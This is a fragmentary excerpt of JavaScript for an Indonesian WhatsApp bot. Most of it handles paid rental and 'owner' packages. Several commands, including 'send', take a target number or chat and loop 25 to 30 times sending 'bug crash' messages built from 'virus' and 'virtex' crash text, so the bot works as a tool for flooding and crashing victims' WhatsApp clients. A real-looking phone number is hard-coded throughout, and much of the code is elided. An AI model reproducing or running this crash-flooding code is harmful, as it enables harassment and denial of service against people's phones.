...
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: '6282274499424@s.whatsapp.net' } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
...
"sellerJid": "6282274499424@s.whatsapp.net",
...
const botzkayla = "6282274499424@s.whatsapp.net"
...
owned = '6282274499424@s.whatsapp.net'
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
...
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 15K • Sewabot 1 Bulan
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '1tahun'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 180K • Sewabot 1 Tahun
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == 'permanent'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 350K • Sewabot Permanent
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
}
break
case 'premkay':
...
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 240K • Jadibot 1 Tahun
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == 'permanent'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 450K • Jadibot Permanent
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
}
break
case 'ownkay':
...
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 20K • Jadi Owner 1 Minggu
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '1bulan'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 40K • Jadi Owner 1 Bulan
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '1tahun'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 480K • Jadi Owner 1 Tahun
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == 'permanent'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 550K • Jadi Owner Permanent
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
}
break
case 'addprem':
if (!itsMeKayla) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6282274499424`)
...
break
case 'send':{
if (!q) return reply(`Penggunaan ${prefix+command} 6282274499424`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = '30'
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(num, `Kayla Bot ${virus}${virtex(prefix)}`, `Kayla Bot ${virus}${virtex(prefix)}`, `Kayla Bot ${virus}${virtex(prefix)}`, ppnyauser, "6282274499424@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
...
"url": `https://wa.me/6282274499424`
},
"businessOwnerJid": "6282274499424@s.whatsapp.net",
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(m.chat, `Kayla Bot ${virus}${virtex(prefix)}`, `Kayla Bot ${virus}${virtex(prefix)}`, `Kayla Bot ${virus}${virtex(prefix)}`, ppnyauser, "6282274499424@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
...
case 'santedpcparah': 
if (!itsMeKayla) return reply(mess.owner)
if (!q) return reply(`Contoh ${command} 6282274499424`)
...
let e = String(err)
sendKaylaMessage("6282274499424@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki " + util.format(e), 
contextInfo:{
forwardingScore: 5, 
isForwarded: true
}})
